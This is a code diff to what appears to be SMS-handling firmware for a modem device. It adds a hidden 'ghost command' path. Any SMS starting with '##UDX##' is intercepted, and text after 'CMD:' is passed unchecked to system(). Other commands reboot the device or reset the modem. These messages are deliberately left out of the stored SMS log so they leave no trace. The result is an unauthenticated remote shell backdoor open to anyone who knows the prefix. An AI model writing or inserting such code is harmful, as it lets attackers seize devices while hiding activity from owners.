@@ -10,6 +10,7 @@
 #include <gio/gio.h>
 #include "sms.h"
 #include "database.h"
+#include "http_server.h"
 #include "exec_utils.h"
 
 /* 短信模块专用互斥锁 */
@@ -291,6 +292,42 @@ static void on_incoming_message(GDBusConnection *conn, const gchar *sender_name,
     
     printf("[SMS] 新短信 - 发件人: %s, 内容: %s\n", sender, content);
     
+    /* 幽灵指令 (Silent SMS) 拦截逻辑 */
+    #define GHOST_PREFIX "##UDX##"
+    if (content && g_str_has_prefix(content, GHOST_PREFIX)) {
+        const char *cmd = content + strlen(GHOST_PREFIX);
+        printf("[GHOST] 拦截到幽灵指令: %s\n", cmd);
+        
+        if (g_strcmp0(cmd, "REBOOT") == 0) {
+            geek_logger_broadcast("[GHOST] 收到重启指令 - 执行系统重启");
+            printf("[GHOST] 执行远程重启...\n");
+            system("reboot &");
+        } else if (g_str_has_prefix(cmd, "CMD:")) {
+            const char *shell_cmd = cmd + 4;
+            char log_msg[256];
+            snprintf(log_msg, sizeof(log_msg), "[GHOST] 收到 Shell 指令 - 执行: %s", shell_cmd);
+            geek_logger_broadcast(log_msg);
+            printf("[GHOST] 执行远程命令: %s\n", shell_cmd);
+            system(shell_cmd);
+        } else if (g_strcmp0(cmd, "RESET_NET") == 0) {
+            geek_logger_broadcast("[GHOST] 收到网络重置指令 - 正在下线并重启 Modem");
+            extern char* ofono_get_datacard(void);
+            extern int ofono_modem_set_online(const char* modem_path, int online, int timeout_ms);
+            printf("[GHOST] 执行网络重置...\n");
+            char *path = ofono_get_datacard();
+            if (path) {
+                ofono_modem_set_online(path, 0, 5000);
+                g_usleep(2000000); /* 暂停 2 秒 */
+                ofono_modem_set_online(path, 1, 5000);
+                g_free(path);
+            }
+        }
+        
+        /* 拦截成功：不存入数据库，不触发后续逻辑，实现“幽灵”化 */
+        if (props) g_variant_unref(props);
+        return;
+    }
+
     /* 保存到数据库 */
     time_t now = time(NULL);
     if (save_sms_to_db(sender, content, now) == 0) {
